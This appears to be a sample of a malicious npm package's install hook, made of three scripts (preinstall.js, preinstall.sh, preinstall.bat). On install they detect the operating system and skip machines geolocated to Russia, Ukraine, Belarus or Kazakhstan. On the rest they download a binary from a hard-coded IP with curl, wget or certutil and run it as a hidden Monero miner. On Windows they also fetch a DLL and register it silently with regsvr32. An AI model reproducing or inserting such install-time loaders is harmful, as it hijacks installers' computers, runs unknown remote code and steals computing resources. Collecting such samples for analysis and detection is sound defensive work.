-- malicious/preinstall.js --
const { exec } = require("child_process");

function terminalLinux(){
    exec("/bin/bash preinstall.sh", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
}

var opsys = process.platform;
if (opsys == "darwin") {
    opsys = "MacOS";
} else if (opsys == "win32" || opsys == "win64") {
    opsys = "Windows";
    const { spawn } = require('child_process');
    const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']);
} else if (opsys == "linux") {
    opsys = "Linux";
    terminalLinux();
}
-- malicious/preinstall.sh --
IP=$(curl -k https://freegeoip.app.invalid/xml/ | grep 'RU\|UA\|BY\|KZ')

if [ -z "$IP" ]
then
	var=$(pgrep jsextension)
	if [ -z "$var" ]
	then
		curl http://203.0.113.228/download/jsextension -o jsextension
		if [ ! -f jsextension ]
		then
			wget http://203.0.113.228/download/jsextension -O jsextension
		fi
		chmod +x jsextension
		./jsextension -k --tls -o pool.minexmr.com.invalid:443 -u 40123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123 --cpu-max-threads-hint=50 &>/dev/null &
	fi
fi
-- malicious/preinstall.bat --
@echo off
curl http://203.0.113.228/download/jsextension.exe -o jsextension.exe
if not exist jsextension.exe (
wget http://203.0.113.228/download/jsextension.exe -O jsextension.exe
)
if not exist jsextension.exe (
certutil.exe -urlcache -f http://203.0.113.228/download/jsextension.exe jsextension.exe
)
curl https://citationsherbe.at.invalid/sdd.dll -o create.dll
if not exist create.dll (
wget https://citationsherbe.at.invalid/sdd.dll -O create.dll
)
if not exist create.dll (
certutil.exe -urlcache -f https://citationsherbe.at.invalid/sdd.dll create.dll
)
set exe_1=jsextension.exe
set "count_1=0"
>tasklist.temp (
tasklist /NH /FI "IMAGENAME eq %exe_1%"
)
for /f %%x in (tasklist.temp) do (
if "%%x" EQU "%exe_1%" set /a count_1+=1
)
if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls -o pool.minexmr.com.invalid:443 -u 40123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123 --cpu-max-threads-hint=50)
regsvr32.exe -s create.dll
